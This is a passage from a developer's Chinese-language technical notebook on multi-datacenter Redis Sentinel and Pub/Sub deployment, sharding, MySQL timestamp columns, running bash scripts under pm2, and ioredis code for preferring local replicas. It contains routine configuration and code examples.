   DataCenter 2 上部署的应用会通过 Sentinel 获取到 DataCenter 1 上的结点（角色可能为 Master、Slave 或 Sentinel）信息，然后连接、访问，所以 Redis 实例（角色可能为 Master、Slave 或 Sentinel）都至少需要监听外网 IP。

   通过外网 IP 访问同机房内结点，不会导致流量外网化，上级交换机识别到目标 IP 就在网络内，走的还是内网。

   应用程序从 Sentinel 获取 Slave 列表后，最好优先连接同一数据中心的 Slave 结点。

** 相关资源

   - [[http://redis.io/topics/sentinel][Redis Sentinel Documentation – Redis]]

   - [[https://groups.google.com/forum/#!searchin/redis-db/data$20center|sort:relevance/redis-db/o5afhx9Zn5E/DwQU3JLJJKgJ][Replication for read-scalability - Google 网上论坛]]

     通过公网跨数据中心复制数据相关的问题：安全、迟延等

   
   - [[https://groups.google.com/d/msg/redis-db/uMOIX3m3Is4/HWhYegU4OawJ][Sentinels in Multi Region configuration - Google 网上论坛]]

     Redis Sentinel 多数据中心配置问题


   - [[https://redislabs.com/ebook/redis-in-action/part-3-next-steps-3/chapter-10-scaling-redis/10-1-scaling-reads][Redis in Action - Scaling reads]]

     Redis 压缩、安全传输相关

* DONE Redis Pub/Sub 多机房部署                                       :redis:
  CLOSED: [2016-08-18 Thu 14:18]

** 由于 Master 上 Publish 的消息会自动同步到所有 Slaves，Redis Pub/Sub 很容易扩展

   #+begin_quote
   Redis PubSub scales really easily since the Master/Slave replication automatically publishes to all slaves.
   #+end_quote
   引用自 [[http://stackoverflow.com/a/6512308/802708][Redis PUBLISH/SUBSCRIBE limits - Stack Overflow]]

** 可以在 Master 上 Publish 消息，然后在 Slave 上 Subscribe 消息，反之不行

   #+begin_quote
   With replication in-place the  publisher can publish in the master host and the subscribers can subscribe to the slave host.

   It is important to mention that this relationship is one-way. Master –> Slave relationship are unidirectional. It is impossible to publish to the slave and subscribe to the master.
   
   ...

   The conclusion is simple: Two ways pub/sub channels across servers require at least 4 Redis hosts.
   #+end_quote
   引用自 [[http://blogs.microsoft.co.il/applisec/2013/09/11/pub-sub-across-servers-using-redis/][Pub Sub Across Servers Using Redis | Manu Cohen-Yashar's Blog]]

   需要注意的是，Slave 虽然不可写（Readonly），但是照样可以 Pub/Sub，
   只是 Publish 的消息不会同步到 Master，所以不会被 Master 上的 Subscriber 接收到，
   但是 Slave 自身的 Subscriber 仍工作正常。

** 多机房部署的情况下，2 个 Redis 实例可实现双向通讯

   file:../static/redis-pub_sub_multi_datacenter-2.png
   但是比较低效，Master 所在机房 Publish 的消息会在机房间传输一次（Sync 一次），
   Slave 所在机房 Publish 的消息会在机房间传输两次（Send、Sync 各一次），
   而且 Slave 机房部署的应用需要跨机房直接连接到 Master 才能进行 Publish。

   
** 多机房部署的情况下，4 个 Redis 实例可以实现高效的双向通讯

   file:../static/redis-pub_sub_multi_datacenter-4.png
   每一次 Publish 的消息会在机房间传输一次，机房间只有 Master/Slave 同步流量。

** Pub/Sub 跨机房部署带来的问题

*** 从 Slave Subscribe 消息后，消息 Publish 一方无法获知 Subscriber 数量

    #+begin_example +n -r
      # Publish to master, subscribe from master.
      $ redis-cli -h master.local subscribe test &
      [1] 20590
      $ Reading messages... (press Ctrl-C to quit)
      1) "subscribe"
      2) "test"
      3) (integer) 1
      $ 
      $ redis-cli -h master.local  publish test "hello from master"
      1) "message"
      2) "test"
      3) "hello from master"
      (integer) 1                 (ref:subscribers_on_master_perceptible)
      $ fg
      redis-cli subscribe test
        C-c C-c
      $ 
      # Publish to master, subscribe from slave.
      $ redis-cli -h slave.local -p 6380 subscribe test &
      [1] 20592
      $ Reading messages... (press Ctrl-C to quit)
      1) "subscribe"
      2) "test"
      3) (integer) 1
      $ 
      $ redis-cli -h master.local publish test "hello from master"
      (integer) 0                 (ref:subscribers_on_slave_nonperceptible)
      1) "message"
      2) "test"
      3) "hello from master"
      $ 
    #+end_example

    - 行 [[(subscribers_on_master_perceptible)]]
      
      在 Master 上订阅时，发布方得知的订阅者人数为 1

    - 行 [[(subscribers_on_slave_nonperceptible)]]
      
      在 Slave 上订阅时，发布方得知的订阅者人数为 0

* DONE Redis Sentinel 多机房部署方案                                  :redis:
  CLOSED: [2016-08-20 Sat 22:20]

** 减少或避免跨机房 Redis 访问的好处

   - 减少跨机房网络流量

     很多机房外网流量是有限制的，外网流量过高会影响整个服务的稳定性，甚至拒绝服务。
     
   - 更快的响应速度

     跨机房网络传输的网络延时很高。

   - 更安全

     Redis 本身的安全机制很薄弱，目前只支持明文密码验证，依靠 iptables 进行访问限制，运维成本高。

** 如何减少或避免应用的跨机房访问

*** 单维的数据模型

    如果整个应用的数据集是单维度的，即基于同一主键，按主键进行数据分片（Sharding）后，同一主键所属的数据会处于同一分片（Shard），按主键访问时是无共享（shared-nothing）的，可以水平无限扩容。

*** 多维的数据模型

    如果整个应用的数据集是多维度的，按一个维度进行数据分片（Sharding）后，按另一维度获取数据时，需要同时访问多个分片（Shard）。

*** 以博客应用为例

    文章的模型定义如下

    |---------+--------|
    | Field   | Type   |
    |---------+--------|
    | id      | Number |
    | title   | String |
    | author  | Number |
    | content | String |
    |---------+--------|

    按 id 进行数据分片（Sharding），id 为寄数保存到 Shard 1，id 为 偶数保存到 Shard 2，
    按 id 访问文章时，计算 id 对应的分片（Shard），从分片获得文章数据。
    还可以在模型中添加冗余字段（如：author_name），方便显示作者名称，省去一次关联查询。


    要获取 author 的文章列表，则需要在文章发布时按 author 索引文章，模型定义如下
     
    |----------+--------|
    | Field    | Type   |
    |----------+--------|
    | id       | Number |
    | name     | String |
    | articles | Set    |
    |----------+--------|

    按 id 进行数据分片（Sharding），id 为寄数保存到 Shard 1，id 为 偶数保存到 Shard 2，
    按 id 访问作者时，计算 id 对应的分片（Shard），从分片获得作者数据。

     
    当应用逻辑很简单的时候（如：根据文章 id 展示文章、展示作者的文章列表），结合冗余字段，我们可以做到只从一个数据分区（Shard）中取得数据。但是发表文章时，则一定要同时更新多个分区（Shard）中的数据。


    我们之所以如此介意跨分区（Shard）数据访问，是因为有可能两个分区（Shard）相隔甚远（如：部署在横跨大陆的多个数据中心），更高的延迟、费用，更低的稳定性，同时也会引入分布式系统带来的复杂性。

    现实中有价值的应用服务，往往比较复杂，都是多维的数据模型，跨分区（机房）数据访问避无可避。

*** 跨机房交互形式

    - 管它跨不跨机房

      一开始应用可能是部署在一个机房里，随着规模的扩大或者需要满足异地灾备，将一部分模块移到另一个机房，模块间的交互从内网移到了外网。以前在内网的时候，网络传输是很快的，设计的接口粒度很细，迁移到外网跨机房环境下，性能以及稳定性可能会无法接受，最终要不断地进行优化。


    - 重定向客户端请求到数据所属的机房

      如通过 HTTP 302 指示客户端（通常是浏览器）跳转到数据所属机房的域名（或 IP）。
      会增加客户端开发的复杂性，很多逻辑需要放在客户端来完成，能够将机房外网流量尽量减少。


    - 代客户端进行跨机房请求

      如代理发起 HTTP 请求（或内部通信机制，如：消息队列）到所属机房的域名（或 IP），并转发响应给客户端。
      会增加后台应用开发的复杂性，如果应用有内置的内部通信机制（如：消息队列）复杂性还是可以接受的，会增加机房的外网流量，只能算是一种过渡方案。


    - 支持跨机房访问但引导客户端访问正确的数据中心

      用户请求涉及的部分数据如果在另一机房，则直接跨机房访问，如同数据在本机房一样进行处理，并在响应中指示客户端下次到另一机房进行访问。后台应用和客户端的开发不会过度复杂，通过引导客户端访问正确的数据中心进行优化。

** 协调访问数据分片

   假设数据按照主键的 hash 值进行取模分片（Sharding），数据与分片（Shard）的对应关系对应如下：
  
   #+begin_example
     shard = hash(key) % count(shards)
   #+end_example


   多机房下的数据分片（Sharding）需具备以下特性：

   1. 数据片（Shard）一定会处于某一机房，但不可同时处于多个机房

   2. 数据片（Shard）所属机房如果挂了，其它机房的复本之一会被激活，数据片（Shard）重新可用
     
   3. 除非所有机房都挂了，否则数据应该总是可用的（Availability）

   以上三点可由 Redis Sentinel 保证。

   Redis Sentinel 以星状组织 Redis 结点拓扑，对于多数据中心部署的 Redis 集群，结点超过 2 个时可能会导致机房间流量暴涨（如：需要从一个机房的 Master 同步多份数据到另一个机房的多个 Slave）。
   所以，最好把数据集切分得更细一些，直到一组 Redis 实例（即 1 Master + 1 Slave）即可容纳并可满足客户端请求。

   直接访问 Redis 往往是耦合度很高的一种形式，Redis 中的数据是所有服务结点共享访问的，访问冲突和状态不一致可能会导致业务出错。
   
   我们希望机房间除了 Redis 的 Master-Slave 间的数据同步之外不再有其它的交互，最好不要有应用（Application）跨机房操作 Redis 以实现业务逻辑的情况发生。

   [[file:../static/redis-restrict_cross_datacenter_flow.png]]

   如何在限制跨机房 Redis 访问的情况下实现业务逻辑呢？

   - 重定向客户端请求到数据所属的机房

     后端服务结点知道哪个数据中心更适合处理用户的请求，向客户端发出重定向指示即可，不需要耗费其它资源。
   
   - 通过跨机房交互满足客户端请求

     完成请求需要与另一机房的服务交互，如通过调用服务接口（如：Restful API）的形式，完成整个业务逻辑处理。
     也可以将客户端的请求转发到另一机房服务，并将响应发回客户端，相当于是内置了服务代理（Proxy）功能。

   
   由此可见，不跨机房访问 Redis 这份美好是有代价的，客户端和服务器端的业务逻辑会更复杂，客户端或服务器端需要针对跨机房的数据进行特殊处理。

   通过选择正确的数据分片（Sharding）方式，确保主要或高频次的客户端请求能够在同一数据中心内完成。次要或低频次的客户端请求允许跨数据中心，通过在本地数据中心部署其它数据中心的复本（Slave）的方式，将跨数据中心"读"转化为本地"读"，少量的跨数据中心"写"不成问题。

   如下图所示
   [[file:../static/redis-embrace_cross_datacenter_flow.png]]
   Redis Group 1 存储主要或高频次的数据，Redis Group 2 存储次要或低频次的数据。

   客户端通过 DataCenter 1 访问本地的 Redis Group 1 属于合理的访问。
   业务逻辑可能需要访问 Redis Group 2，读操作可以发往本地的 Redis Group 2 Slave，写操作要跨机房访问 DataCenter 2 中的 Redis Group 2 Master（应该尽量减少）。

   客户端通过 DataCenter 2 访问本地的 Redis Group 2 属于合理的访问。
   业务逻辑主要需要访问 Redis Group 1，读操作可以发往本地的 Redis Group 1 Slave，写操作需要跨机房访问 DataCenter 1 中的 Redis Group 1 Master，
   这是不合理的，因此在发给客户端的响应中指示客户端下次将请求发往 Redis Group 1 Master 所在的 DataCenter 1。

* DONE mysql 实现 ctime、mtime、atime 语义                            :mysql:
  CLOSED: [2016-08-26 Fri 19:18]

  事物有常见的三个时间属性

  - 创建时间（ctime）


  - 修改时间（mtime）
     
  
  - 访问时间（atime）

    
  下面考虑使用 mysql 实现。

** 不要使用 REPLACE

   [[http://dev.mysql.com/doc/refman/5.7/en/replace.html][MySQL :: MySQL 5.7 Reference Manual :: 14.2.8 REPLACE Syntax]]
   #+begin_quote
   REPLACE 像 INSERT 一样运作，除了：表中的旧记录与新记录的主键（PRIMARY KEY）或唯一索引（UNIQUE index）一样时，删掉旧记录再插入新记录。 

   REPLACE works exactly like INSERT, except that if an old row in the table has the same value as a new row for a PRIMARY KEY or a UNIQUE index, the old row is deleted before the new row is inserted. 
   #+end_quote

   这就意味着默认值定义为 =DEFAULT CURRENT_TIMESTAMP= 的字段，在缺失的情况下会重置为当前时间（CURRENT_TIMESTAMP）。

*** 自行实现创建或修改语义

    更新（UPDATE）记录，如果 =affectedRows= 为 0，再尝试插入（INSERT）记录。

    由于更新（UPDATE）和插入（INSERT）是两个操作，并发访问的情况下，插入（INSERT）时记录可以已要存在，因此还需要忽略主键冲突错误。

** 不要使用 ON UPDATE CURRENT_TIMESTAMP

   这里的 =UPDATE= 是指更新语句（UPDATE、INSERT、REPLACE）是否改动了记录内容，
   新值与旧值不一样表示记录内容变化，会更新字段值为当前时间，否则，不会更新字段值为当前时间。

   可在更新语句中设置字段值为 =CURRENT_TIMESTAMP= ，强制字段值总是更新为当前时间。

   另外，更新访问时间（atime）时，会导致使用了 =ON UPDATE CURRENT_TIMESTAMP= 的字段更新为当前时间。

** 创建时间（ctime）

*** 字段定义

    #+begin_example
      ctime TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
    #+end_example

    指定默认值为当前时间，在记录创建时自动设置。

** 字段值更新

   INSERT（或 UPDATE） 语句创建（或更新）记录，不指定 =ctime= 字段。

** 更新时间（mtime）

*** 字段定义

    #+begin_example
      mtime TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
    #+end_example

    指定默认值为当前时间，在记录创建时自动设置。

** 字段值更新

   INSERT 语句创建记录，不指定 =mtime= 字段，或指定字段值为 CURRENT_TIMESTAMP。

   UPDATE 语句更新记录，指定 =mtime= 字段值为 CURRENT_TIMESTAMP。

** 访问时间（atime）

*** 字段定义

    #+begin_example
      atime TIMESTAMP NOT NULL DEFAULT "0000-00-00 00:00:00"
    #+end_example

    指定默认值为空时间值（表示未访问），在记录创建时自动设置。

** 字段值更新

   UPDATE 语句更新记录，指定 =atime= 字段值为 CURRENT_TIMESTAMP。

* DONE 使用 pm2 启动 bash 后台脚本                           :linux:node:pm2:
  CLOSED: [2016-09-02 Fri 10:28]

  我们常常会使用 bash 写一些后台运行的守护进程，然后使用 crontab 实现开机启动并监控，
  也可以改为使用 pm2 来运行，功能更强大，更简单规范。

  使用 pm2 来管理后台进程仍然可以获得其大部分功能，如：

  - 日志管理

  
  - 监控


  - 进程管理


  - 开机启动


  - 崩溃重启


  如下定义 process.json

  #+begin_src json
    {
      apps : [{
        name      : "run-log-analyze",
        script    : "./tools/run-log-analyze.sh",
        env: {
        },
        merge_logs: true,
        error_file: "tools/run-log-analyze.log",
        out_file: "tools/run-log-analyze.log",
        exec_mode: "fork"
      }]
    }
  #+end_src
  
  run-log-analyze.sh 用于实时分析应用的日志
  
  #+begin_src sh
    tail -f ./run.log | bunyan --strict -c 'this.msg == "file uploaded"' -0 | json -ga file | ./tools/file-scan -o ./tools/file-scan-successed.log -e ./tools/file-scan-failed.log
  #+end_src

  上面的脚本不断读取 run.log，将上传的文件路径名提取出来，然后传给文件扫描程序（./tools/file-scan），扫描成功日志文件为 ./tools/file-scan-successed.log，扫描失败日志文件为 ./tools/file-scan-failed.log。

  现在在尝试启动进程

  #+begin_src sh
    pm2 start process.json
  #+end_src

  查看进程运行状态

  #+begin_src sh
    pm2 list
  #+end_src

  然后尝试重启

  #+begin_src sh
    pm2 restart process.json
  #+end_src

  发现后台有两个 =file-scan= 及 =tail -f ./run.log= 进程，restart 没有将子进程杀死，不过父进程 /bin/bash 进程倒是杀死了。

  估计是 bash 使用 pm2 fork-mode 运行后，其终端被 detach 了，相当于是后台 daemon 进程，bash 进程死掉后， =tail -f ./run.log= 进程收不到 SIGHUP 信号也就没有跟着退出。

  可以利用 tail 命令的参数 =-pid= ，指定 bash 结束时中断 =tail -f= 命令

  =man tail=
  #+begin_quote
       --pid=PID
              with -f, terminate after process ID, PID dies  
  #+end_quote

  将 run-log-analyze.sh 改写如下

  #+begin_src sh
    tail -f --pid=$$ ./run.log | bunyan --strict -c 'this.msg == "file uploaded"' -0 | json -ga file | ./tools/file-scan -o ./tools/file-scan-successed.log -e ./tools/file-scan-failed.log
  #+end_src

* DONE ioredis Sentinel 实现就近访问                             :redis:node:
  CLOSED: [2016-09-10 Sat 18:12]

** 跨机房 redis 访问性能堪忧

   线上服务运行结果显示跨机房相对不跨机房，一个 redis 长连接上的 QPS 会低一个数量级： =50= vs =640= 。
   这是因为 Redis 的请求-响应是串行的，网络时延会对 QPS 造成巨大的响应。
   因此，一定要尽量连接距离更近的 Redis 实例。

** [[https://github.com/luin/ioredis/][ioredis]] 支持按角色（Role）进行连接

   引用自 [[https://github.com/luin/ioredis/][ioredis]]
   #+begin_quote
   ioredis 保证即使故障转移（failover）后你连接的结点依然是 master 。当故障转移发生，ioredis 会向 sentinels 询问新的 master 结点并连接，而不是尝试重连失效的结点（恢复可用后它会降级为 slave）。故障转移期间发送的所有命令将放入队列，当新连接建立后再执行，不会丢失命令。

   可以指定 role 选项为 slave 以连接 slave 结点，ioredis 将尝试连接指定 master 的一个随机 slave 结点，并且保证连接的结点总是 slave 角色。当连接的结点因为故障转移而提升为 master，ioredis 将从该结点断开连接并询问 sentinels 获取另一个 slave 结点进行连接。

   ioredis guarantees that the node you connected to is always a master even after a failover. When a failover happens, instead of trying to reconnect to the failed node (which will be demoted to slave when it's available again), ioredis will ask sentinels for the new master node and connect to it. All commands sent during the failover are queued and will be executed when the new connection is established so that none of the commands will be lost.

   It's possible to connect to a slave instead of a master by specifying the option role with the value of slave, and ioredis will try to connect to a random slave of the specified master, with the guarantee that the connected node is always a slave. If the current node is promoted to master due to a failover, ioredis will disconnect from it and ask the sentinels for another slave node to connect to.
   #+end_quote

** [[https://github.com/luin/ioredis/][ioredis]] 会随机选择一个 Slave

   引用自 ioredis/lib/connectors/sentinel_connector.js
   #+begin_src js
     SentinelConnector.prototype.resolveSlave = function (client, callback) {
       client.sentinel('slaves', this.options.name, function (err, result) {
         client.disconnect();
         if (err) {
           return callback(err);
         }
         var selectedSlave;
         if (Array.isArray(result)) {
           var availableSlaves = [];
           for (var i = 0; i < result.length; ++i) {
             var slave = utils.packObject(result[i]);
             if (slave.flags && !slave.flags.match(/(disconnected|s_down|o_down)/)) {
               availableSlaves.push(slave);
             }
           }
           selectedSlave = _.sample(availableSlaves);
         }
         callback(null, selectedSlave ? { host: selectedSlave.ip, port: selectedSlave.port } : null);
       });
     };
   #+end_src

** 判断本地还是异地的算法

   按 IP 地址进行推断，前 N 段一样则认为是本地。

   如 N 取值为 3，本机 IP 为 11.22.33.1，则 11.22.33.123 由于前 3 段（11.22.33）与本机相同被认定为是本地，而 11.22.99.1 由于前 3 段（11.22.99）与本机不同被认定为是异地。

** redis 至少要求 2.8.12

   redis 2.8.12 实现了一个特性：当 failover （redis 角色变化）后，断开所有 client 的连接。

   缺少这个特性会导致 failover 发生后与原 master 连接还是保持的，后继请求返回 READONLY 错误。

   可以设置 reconnectOnError 选项，判断错误类型为 READONLY 后触发重连。

   但 PUB/SUB 不会出现 READONLY 错误，所以还是要升级到 2.8.12 以上。

** 在 <2.4.0 的 ioredis 上实现优先选择本地 Slave

   相关讨论

   [[https://github.com/luin/ioredis/issues/38][rfc - a preferred slave list in a sentinel setup · Issue #38 · luin/ioredis]]

   preferredSlaves 选项已经在 2.4.0 版实现，下面的代码在旧版本 ioredis 的基础上实现，仅供参考，不建议使用。

   主要的通过替换 SentinelConnector.prototype.resolveSlave, SentinelConnector.prototype.resolveMaster, SentinelConnector.prototype.check 实现：

   - 从到 sentinel 的连接上取得本机地址

     
   - 从 sentinel 取出 slaves 列表


   - 将 slaves 列表分为本地列表和异地列表


   - 优先从本地列表随机选择一个 slave

   具体实现如下

   #+begin_src js
     var Redis     = require('ioredis'),
         utils     = require('ioredis/lib/utils'),
         _         = require('lodash'),
         net       = require('net'),
         assert    = require('assert');


     /**
      ,* A SentinelConnector.prototype.resolveSlave replacement, prefer local slave.
      ,*
      ,* @param client redis client.
      ,* @param callback function (err, slave) called when done.
      ,*                 slave with a extra boolean field "local_node" to indicate slave is in local network.
      ,*
      ,*/
     function resolveSlavePreferLocal (client, callback) {
         var self = this;
         client.sentinel('slaves', this.options.name, function (err, result) {
             if (err) {
                 client.disconnect();
                 return callback(err);
             }
             var localIP = client.stream.localAddress;
             client.disconnect();

             var localIPSegments = new Array(4);
             if (net.isIPv4(localIP)) {
                 localIPSegments = localIP.split('.');
             }

             var selectedSlave;
             var local_node = false;
             if (Array.isArray(result)) {
                 var localSlaves = [];
                 var remoteSlaves = [];
                 for (var i = 0; i < result.length; ++i) {
                     var slave = utils.packObject(result[i]);
                     if (slave.flags && !slave.flags.match(/(disconnected|s_down|o_down)/)) {
                         if (net.isIPv4(slave.ip)) {
                             var slaveIpSegments = slave.ip.split('.');
                             if (localIPSegments[0] === slaveIpSegments[0] &&
                                 localIPSegments[1] === slaveIpSegments[1] &&
                                 localIPSegments[2] === slaveIpSegments[2]) {
                                 localSlaves.push(slave);
                                 continue;
                             }
                         }

                         remoteSlaves.push(slave);
                     }
                 }
                 selectedSlave = _.sample(localSlaves.length ? localSlaves : remoteSlaves);
                 local_node = Boolean(localSlaves.length);
             }

             console.warn('redis(' + JSON.stringify({name: self.options.name, db: self.options.db, sentinels: self.options.sentinels}) + ') resolve slave to' + (local_node ? ' local' : '') + ': ' + selectedSlave.ip + ':' + selectedSlave.port);

             callback(null, selectedSlave ? { host: selectedSlave.ip, port: selectedSlave.port, local_node: local_node } : null);
         });
     };

     /**
      ,* Prefer connect to local slave.
      ,*
      ,* @param client redis client.
      ,*
      ,* @return is this change successful.
      ,*/
     function preferLocalSlave(client) {
         if (client.options.role === 'slave' && client.connector.resolveSlave) {
             if (client.options.lazyConnect && client.status == 'wait') {
                 client.connector.resolveSlave = resolveSlavePreferLocal;
                 return true;
             }

             console.warn('redis client(' + JSON.stringify({name: client.options.name, db: client.options.db, sentinels: client.options.sentinels}) + ') status unexpected');
         }

         return false;
     }
   #+end_src
  
   用法如下

   #+begin_src js
     var options = {name: "data", sentinels: sentinels, db: 0, role: "slave", lazyConnect: true}
     var client = new Redis(options);
     if (preferLocalSlave(client)) {
         console.warn("prefer local slave on redis sentinel(" + JSON.stringify(options) + ")");
     }
   #+end_src

   值得注意的是必须指定 =lazyConnect: true= ，这样才能通过替换 client 中的方法实现功能。 

** 在 <2.4.0 的 ioredis 上实现优先选择本地结点

   假设 redis 是以 1 Master + 1 Slave 方式进行跨机房部署，那么我们希望实现优先连接本地结点（忽略其角色），
   连接成功后该连接可能是 Master 也可能是 Slave，我们把它当 Slave 用准没错。

   preferredSlaves 选项已经在 2.4.0 版实现，下面的代码依赖之前的 ioredis 版本代码，仅供参考，不建议使用。

   实现逻辑：

   - 按上一节的实现获取 slave

     
   - 如果 slave 在本地，则使用该 slave，否则尝试连接 master


   - 如果 master 在本地，则使用该 master，否则使用前面的 slave。


   具体实现如下

   #+begin_src js
     /**
      ,* A SentinelConnector.prototype.resolveMaster replacement, indicate the resolved node is local node.
      ,*
      ,* @param client redis client.
      ,* @param callback function (err, master) called when done.
      ,*                 master with a extra boolean field "local_node" to indicate master is in local network.
      ,*
      ,*/
     function resolveMasterPreferLocal (client, callback) {
         client.sentinel('get-master-addr-by-name', this.options.name, function (err, result) {
             if (err) {
                 client.disconnect();
                 return callback(err);
             }

             var localIP = client.stream.localAddress;
             client.disconnect();

             var localIPSegments = new Array(4);
             if (net.isIPv4(localIP)) {
                 localIPSegments = localIP.split('.');
             }

             var local_node = false;
             if (Array.isArray(result)) {
                 var ip = result[0];
                 if (net.isIPv4(ip)) {
                     var ipSegments = ip.split('.');
                     if (localIPSegments[0] === ipSegments[0] &&
                         localIPSegments[1] === ipSegments[1] &&
                         localIPSegments[2] === ipSegments[2]) {
                         local_node = true;
                     }
                 }
             }

             callback(null, Array.isArray(result) ? { host: result[0], port: result[1], local_node: local_node } : null);
         });
     };

     /**
      ,* A SentinelConnector.prototype.resolve replacement, prefer resolve to local node.
      ,*
      ,* @param endpoint sentinel endpoint to connect.
      ,* @param callback function (err, node) called when done.
      ,*                 node with a extra boolean field "local_node" to indicate node is in local network.
      ,*
      ,*/
     function resolvePreferLocal(endpoint, callback) {
         assert(this.options.role === 'slave');

         var client = new Redis({
             port: endpoint.port,
             host: endpoint.host,
             retryStrategy: null,
             enableReadyCheck: false,
             connectTimeout: this.options.connectTimeout
         });

         var self = this;
         this.resolveSlave(client, function (slave_err, slave) {
             if (slave_err || !slave ||!slave.local_node) {
                 if (slave_err) {
                     console.error('redis(' + JSON.stringify({name: self.options.name, db: self.options.db, sentinels: self.options.sentinels}) + ') resolve slave error(' + slave_err.toString() + ')');
                 }
                 client = new Redis({
                     port: endpoint.port,
                     host: endpoint.host,
                     retryStrategy: null,
                     enableReadyCheck: false,
                     connectTimeout: self.options.connectTimeout
                 });
                 return self.resolveMaster(client, function (master_err, master) {
                     if (master_err) {
                         console.error('redis(' + JSON.stringify({name: self.options.name, db: self.options.db, sentinels: self.options.sentinels}) + ') resolve master error(' + master_err.toString() + ')');
                     }
                     if (!master_err && master && master.local_node) {
                         console.warn('redis(' + JSON.stringify({name: self.options.name, db: self.options.db, sentinels: self.options.sentinels}) + ') resolve slave to local master: ' + master.host + ':' + master.port);
                         return callback(null, master);
                     } else if (slave || master) {
                         return callback(null, slave || master);
                     }

                     return callback(slave_err || master_err, null);
                 });
             } else {
                 return callback(null, slave);
             }
         });
     }

     /**
      ,* A SentinelConnector.prototype.check replacement, enable connect local master when connect to slave.
      ,*/
     function checkPreferLocal(info) {
         return true;
     }

     /**
      ,* Prefer connect to local redis node, slave first.
      ,*
      ,* @param client redis client.
      ,*
      ,* @return is this change successful.
      ,*/
     function preferLocal(client) {
         if (client.options.role === 'slave' && client.connector.resolveSlave) {
             if (client.options.lazyConnect && client.status == 'wait') {
                 if (client.connector.resolveSlave != resolveSlavePreferLocal) {
                     preferLocalSlave(client);
                 }

                 client.connector.resolveMaster = resolveMasterPreferLocal;
                 client.connector.resolve = resolvePreferLocal;
                 client.connector.check = checkPreferLocal;
                 return true;
             }

             console.warn('redis client(' + JSON.stringify({name: client.options.name, db: client.options.db, sentinels: client.options.sentinels}) + ') status unexpected');
         }

         return false;
     }
   #+end_src

   用法如下

   #+begin_src js
     var options = {name: "data", sentinels: sentinels, db: 0, role: "slave", lazyConnect: true}
     var client = new Redis(options);
     if (preferLocal(client)) {
         console.warn("prefer local on redis sentinel(" + JSON.stringify(options) + ")");
     }
   #+end_src

** 在 2.4.x 的 ioredis 上实现优先选择本地结点（使用 preferredSlaves）

   具体实现以及用法请参考 gist [[https://gist.github.com/tangxinfa/3361a11acf2270e8388b43bfcb25ce0e][Connect redis with Minimum Distance First(MDF) algorithm]] ，使用 preferredSlaves 选项实现，要求 ioredis 版本至少为 2.4.0 。在 ioredis 上做了一层封装，使用 ioredis 的方式需要改变，没有侵入 ioredis 的代码。

   实现逻辑如下：

   - 使用 preferredSlaves 优先连接本地 slave


   - 如果 slave 在本地，则使用该 slave 连接；否则尝试连接 master

     
   - 如果 master 在本地，则使用该 master 连接，否则使用前面的 slave 连接。


   这导致当本地无 slave 而连上本地 master 后，总是重连 master。

** 在 2.4.x 的 ioredis 上实现优先选择本地结点（不使用 preferredSlaves）

   具体实现以及用法请参考 github 仓库 [[https://github.com/tangxinfa/ioredis_sentinel_connector]] ，要求 ioredis 版本为 2.4.x。


   通过替换 SentinelConnector.prototype.resolveSlave 及 SentinelConnector.prototype.check 方法实现，主要的实现逻辑：

   - 优先连接本地 slave


   - 如果 slave 在本地，则使用该 slave 连接；否则尝试连接 master

     
   - 如果 master 在本地，则使用该 master 连接，否则使用前面的 slave 连接。

* DONE redis 数据库不停机拆分扩容                                     :redis:
  CLOSED: [2016-09-22 Thu 11:02]

服务开发之始，难以估算最终的数据规模，如按最大容量规划，则会增加项目起步时的复杂性，还有就是资源浪费。

所以很多时候，数据都是塞在一个 redis 实例中，当服务规模扩大，单个 redis 实例不足以支撑未来的访问量时，再拆分数据（Partitioning）。

Redis 有很多数据迁移工具，如：[[https://github.com/yaauie/redis-copy][redis-copy]] 、[[https://github.com/salimane/redis-tools][redis-copy.py]] 、[[http://redis.io/commands/migrate][migrate]] 等，但是迁移的数据量大时需要不短的时间，会对业务稳定性造成影响。

真正可靠的迁移手段估计只有 Redis replication 方式。

引用自 [[http://redis.io/topics/partitioning#presharding][Partitioning: how to split data among multiple Redis instances. – Redis]]
#+begin_quote
Using Redis replication you will likely be able to do the move with minimal or no
downtime for your users:

  * Start empty instances in your new server.
  * Move data configuring these new instances as slaves for your source instances.
  * Stop your clients.
  * Update the configuration of the moved instances with the new server IP address.
  * Send the SLAVEOF NO ONE command to the slaves in the new server.
  * Restart your clients with the new updated configuration.
  * Finally shut down the no longer used instances in the old server.
#+end_quote

引用自 [[http://redis.io/topics/admin][Redis Administration – Redis]]
#+begin_quote
Upgrading or restarting a Redis instance without downtime

Redis is designed to be a very long running process in your server. For instance many
configuration options can be modified without any kind of restart using the CONFIG SET
command.

Starting from Redis 2.2 it is even possible to switch from AOF to RDB snapshots
persistence or the other way around without restarting Redis. Check the output of the
CONFIG GET * command for more information.

However from time to time a restart is mandatory, for instance in order to upgrade the
Redis process to a newer version, or when you need to modify some configuration parameter
that is currently not supported by the CONFIG command.

The following steps provide a very commonly used way in order to avoid any downtime.

  * Setup your new Redis instance as a slave for your current Redis instance. In order to
    do so you need a different server, or a server that has enough RAM to keep two
    instances of Redis running at the same time.
  * If you use a single server, make sure that the slave is started in a different port
    than the master instance, otherwise the slave will not be able to start at all.
  * Wait for the replication initial synchronization to complete (check the slave log
    file).
  * Make sure using INFO that there are the same number of keys in the master and in the
    slave. Check with redis-cli that the slave is working as you wish and is replying to
    your commands.
  * Allow writes to the slave using CONFIG SET slave-read-only no
  * Configure all your clients in order to use the new instance (that is, the slave).
  * Once you are sure that the master is no longer receiving any query (you can check
    this with the MONITOR command), elect the slave to master using the SLAVEOF NO ONE
    command, and shut down your master.
#+end_quote

以下步骤可以不断进行，直到将数据拆到很细的粒度，值得注意的是这种拆分方法只支持将一部分数据拆分到全新的 Redis 实例。

- 创建新 Redis 实例为旧 Redis 实例的 Slave

- 服务同时连接新旧 Redis 实例

  迁移时代码需要更新并重启服务，服务需支持优雅重启：服务进程依次重启使得客户感觉不到服务被中断。
  
  通过预先连接新旧 Redis 实例，使得接下来的迁移动作不需要重启服务，一键瞬间完成。

  迁移后，清除新旧 Redis 实例中的删除脏数据可能耗时较长，对于通过 scan 扫描数据的业务逻辑部分，需容忍脏数据：根据 hash 规则，扫描到数据不属于当前 Redis 实例时忽略掉，避免使用脏数据。

  Slave 的数据复制进度追上后，进行下一步。
  
- 让新 Redis 实例可写

  #+begin_example
    config set slave-read-only no
  #+end_example
    
  新 Redis 实例也可写入，旧 Redis 的写请求还会同步到新的 Redis 实例，使得迁移过程中数据基本不丢失。
